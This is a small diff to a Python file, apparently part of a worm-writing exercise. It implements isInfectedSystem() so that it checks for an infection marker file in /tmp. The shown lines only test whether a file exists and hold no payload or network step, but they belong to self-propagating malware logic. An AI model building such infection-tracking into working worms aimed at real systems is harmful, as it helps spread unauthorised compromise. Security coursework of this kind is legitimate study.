@@ -26,7 +26,7 @@ def isInfectedSystem():
 	# infected.txt in directory /tmp (which
 	# you created when you marked the system
 	# as infected). 
-	pass
+	return os.path.exists(INFECTED_MARKER_FILE)
 
 #################################################################
 # Marks the system as infected
